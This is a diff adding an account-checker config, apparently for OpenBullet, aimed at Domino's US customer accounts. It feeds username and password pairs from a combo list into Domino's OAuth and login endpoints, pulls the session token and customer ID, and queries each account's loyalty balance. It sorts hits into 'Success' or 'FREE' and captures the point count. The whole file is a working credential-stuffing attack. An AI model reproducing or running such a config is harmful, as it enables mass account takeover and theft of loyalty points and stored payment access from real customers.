@@ -1,0 +1,82 @@
+[SETTINGS]
+{
+  "Name": "Dominos US",
+  "SuggestedBots": 1,
+  "LastModified": "2018-12-23T02:24:52.1470936+01:00",
+  "AdditionalInfo": "",
+  "Author": "FreakShock",
+  "Version": "1.0.0",
+  "NeedsProxies": false,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "AllowedWordlist1": "None",
+  "AllowedWordlist2": "None",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+[SCRIPT]
+REQUEST POST "https://api.dominos.com/as/token.oauth2" AutoRedirect=TRUE 
+  CONTENT "grant_type=password&validator_id=VoldemortCredValidator&client_id=nolo-rm&scope=customer%3Acard%3Aread+customer%3Aprofile%3Aread%3Aextended+customer%3AorderHistory%3Aread+customer%3Acard%3Aupdate+customer%3Aprofile%3Aread%3Abasic+customer%3Aloyalty%3Aread+customer%3AorderHistory%3Aupdate+customer%3Acard%3Acreate+customer%3AloyaltyHistory%3Aread+order%3Aplace%3AcardOnFile+customer%3Acard%3Adelete+customer%3AorderHistory%3Acreate+customer%3Aprofile%3Aupdate+easyOrder%3AoptInOut+easyOrder%3Aread&username=<USER>&password=<PASS>" 
+  CONTENTTYPE "application/x-www-form-urlencoded; charset=UTF-8" 
+  HEADER "Accept: application/json, text/javascript, */*; q=0.01" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.102 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Host: api.dominos.com" 
+  HEADER "Connection: keep-alive" 
+  HEADER "DPZ-Market: UNITED_STATES" 
+  HEADER "Origin: https://api.dominos.com" 
+  HEADER "DPZ-Language: en" 
+  HEADER "Authorization: bm9sby1ybTo=" 
+  HEADER "X-DPZ-D: 3d79766ac12c9a3f842082718854a2a78251f16a83820b41f42ce07919a4b376" 
+  HEADER "Market: UNITED_STATES" 
+  HEADER "Referer: https://api.dominos.com/assets/build/xdomain/proxy.html" 
+PARSE "<SOURCE>" LR "access_token\":\"" "\"" Recursive=FALSE -> VAR "TOKEN" "" "" 
+KEYCHECK BanOn4XX=FALSE BanOnToCheck=FALSE 
+  KEYCHAIN Failure OR 
+    KEY "invalid_grant" 
+REQUEST POST "https://order.dominos.com/power/login" AutoRedirect=TRUE 
+  CONTENT "loyaltyIsActive=true&rememberMe=true&u=<USER>&p=<PASS>" 
+  CONTENTTYPE "application/x-www-form-urlencoded; charset=UTF-8" 
+  HEADER "Accept: application/json, text/javascript, */*; q=0.01" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.102 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Host: order.dominos.com" 
+  HEADER "Connection: keep-alive" 
+  HEADER "DPZ-Market: UNITED_STATES" 
+  HEADER "Origin: https://order.dominos.com" 
+  HEADER "DPZ-Language: en" 
+  HEADER "Authorization: Bearer <TOKEN>" 
+  HEADER "X-DPZ-D: 3d79766ac12c9a3f842082718854a2a78251f16a83820b41f42ce07919a4b376" 
+  HEADER "Market: UNITED_STATES" 
+  HEADER "Referer: https://order.dominos.com/en/assets/build/xdomain/proxy.html" 
+PARSE "<SOURCE>" LR "CustomerID\":\"\" " "\"" Recursive=FALSE -> VAR "<TOKEN2>" "" "" 
+REQUEST GET "https://order.dominos.com/power/customer/<TOKEN2>/loyalty" AutoRedirect=TRUE 
+  CONTENT "" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: application/json, text/javascript, */*; q=0.01" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.102 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Host: order.dominos.com" 
+  HEADER "Connection: keep-alive" 
+  HEADER "DPZ-Market: UNITED_STATES" 
+  HEADER "DPZ-Language: en" 
+  HEADER "Authorization: Bearer <TOKEN>" 
+  HEADER "Content-Type: application/json; charset=utf-8" 
+  HEADER "X-DPZ-D: 3d79766ac12c9a3f842082718854a2a78251f16a83820b41f42ce07919a4b376" 
+  HEADER "Market: UNITED_STATES" 
+  HEADER "Referer: https://order.dominos.com/en/assets/build/xdomain/proxy.html" 
+KEYCHECK BanOn4XX=FALSE BanOnToCheck=TRUE 
+  KEYCHAIN CUSTOM "FREE" OR 
+    KEY "VestedPointBalance\":0" 
+    KEY "<HEADERS{*}>" Contains "Not Found" 
+  KEYCHAIN Success OR 
+    KEY "<SOURCE>" DoesNotContain "VestedPointBalance\":0" 
+PARSE "<SOURCE>" LR "VestedPointBalance\":" "," Recursive=FALSE -> CAP "points" "" "" 
